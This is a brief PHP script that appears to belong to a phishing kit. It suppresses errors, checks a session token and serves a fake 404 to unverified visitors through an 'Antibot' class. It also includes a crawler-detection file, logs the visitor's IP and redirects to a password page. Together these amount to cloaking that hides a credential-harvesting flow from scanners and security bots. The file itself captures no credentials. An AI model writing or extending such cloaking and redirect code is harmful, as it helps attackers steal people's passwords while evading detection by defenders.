<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    } 
$ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['token']; 
include '../../crawlerdetect.php';
header("Location: password.php?token=$hash");

?>